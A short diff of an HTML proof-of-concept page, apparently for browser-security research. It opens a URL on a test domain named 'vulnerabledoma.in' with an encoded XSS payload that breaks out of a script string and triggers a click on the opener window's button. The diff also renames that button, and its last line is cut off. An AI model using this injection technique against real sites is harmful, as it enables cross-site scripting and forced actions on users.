@@ -5,4 +5,5 @@ function go(){
 	window.open("http://vulnerabledoma.in/xss_js?q=%22%3B~{valueOf:opener.button.click}//");
 }
 </script>
-<button onclick="go()">go</button>
+<input onclick="go()" type="submit" name="button1" value="Button1" />
+<
